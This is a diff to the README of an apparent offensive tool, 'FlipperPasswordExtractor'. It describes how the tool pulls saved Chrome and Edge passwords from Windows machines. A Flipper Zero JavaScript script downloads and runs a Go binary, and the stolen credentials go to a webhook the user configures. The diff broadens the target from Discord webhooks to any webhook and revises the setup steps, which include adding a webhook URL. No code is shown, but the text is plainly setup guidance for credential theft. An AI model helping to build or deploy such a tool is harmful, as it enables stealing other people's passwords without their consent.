@@ -1,5 +1,5 @@
 # FlipperPasswordExtractor
-Extract saved browser passwords to a discord webhook.<br/>
+Extract saved browser passwords to a webhook.<br/>
 Currently supports:
 - Chrome Browser
 - Edge Browser
@@ -7,6 +7,6 @@ Currently supports:
 The extractor is written in `Golang`, the current build is compiled to windows. The 
 flipperzero javascript script downloads the binary and runs it, and sends to the webhook defined in the js file.
 ## setup
-- add your webhook url to the .js file
-- add chrome/edge javascript to your flipper
-
+- Add your webhook url to the .js file
+- Adjust the `$webhookContent` to match the format of the webhook.
+- add chrome/edge javascript to your flipper.
